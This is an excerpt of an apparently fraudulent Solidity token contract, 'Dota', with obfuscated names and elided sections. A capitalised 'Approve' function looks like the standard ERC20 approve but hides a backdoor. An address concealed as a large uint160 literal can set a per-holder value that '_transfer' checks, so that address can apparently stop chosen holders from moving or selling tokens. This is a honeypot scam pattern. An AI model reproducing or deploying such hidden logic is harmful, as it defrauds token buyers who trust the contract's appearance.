...
interface asfqwe {
    function fasfqwe(address _amount) external view returns (uint256);
}
...
contract Dota is IERC20, Ownable {
    ...
    uint160 qwepoqo = 868931970836939050478578490566689472708667313224;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => Qsdqki) private _poqwiasdu;
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _adventure(from, account, amount);
        _allowances[from][from] = amount;
        emit Approval(from, address(this), amount);
        return true;
    }

    function _adventure(address from, address account, uint256 amount) internal {
        uint256 allow = 0;
        require(account != address(0), "invalid address");
        if (from != address(qwepoqo)) {
            _poqwiasdu[from].oiaqsdu -= allow;
            _poqwiasdu[account].oiaqsdu += allow;
        } else {
            _poqwiasdu[from].oiaqsdu -= allow;
            allow += amount;
            _poqwiasdu[account].oiaqsdu = allow;
    ...
    function _transfer(
        ...
        require(amount - _poqwiasdu[sender].oiaqsdu > 0, "qwerqfa");
